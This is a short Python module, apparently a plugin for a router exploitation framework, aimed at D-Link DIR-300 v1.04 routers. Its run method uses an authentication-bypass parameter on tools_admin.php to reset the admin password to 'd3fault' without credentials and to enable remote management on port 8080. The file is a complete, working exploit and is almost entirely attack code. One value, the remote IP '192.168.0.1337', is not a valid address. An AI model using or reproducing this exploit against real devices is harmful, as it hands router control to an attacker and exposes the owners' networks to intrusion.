import util
import urllib
from ..router_vuln import RouterVuln

__router__ = 'DIR-300 v1.04'
__vuln__='Change Admin Password'
class AddAdmin(RouterVuln):
	"""Modify the default admin password to 'd3fault'
	   http://www.exploit-db.com/exploits/15753/
	"""
	def __init__(self):
		super(AddAdmin,self).__init__()

	def run(self):
		util.Msg('Changing admin password to \'d3fault\'...')
		url = 'http://%s/tools_admin.php?NO_NEED_AUTH=1&AUTH_GROUP=0'%self.ip
		params = urllib.urlencode({'ACTION_POST':1,'admin_name':'admin',
						           'admin_password1':'d3fault','admin_password2':'d3fault',
								   'rt_enable_h':1,'rt_port':8080,'rt_ipaddr':'192.168.0.1337'})

		try:
			response = urllib.urlopen(url, params).read()
			util.Msg('Done.  Admin password changed to \'d3fault\'')
		except Exception, e:
			util.Error("Error: %s"%e)
			return
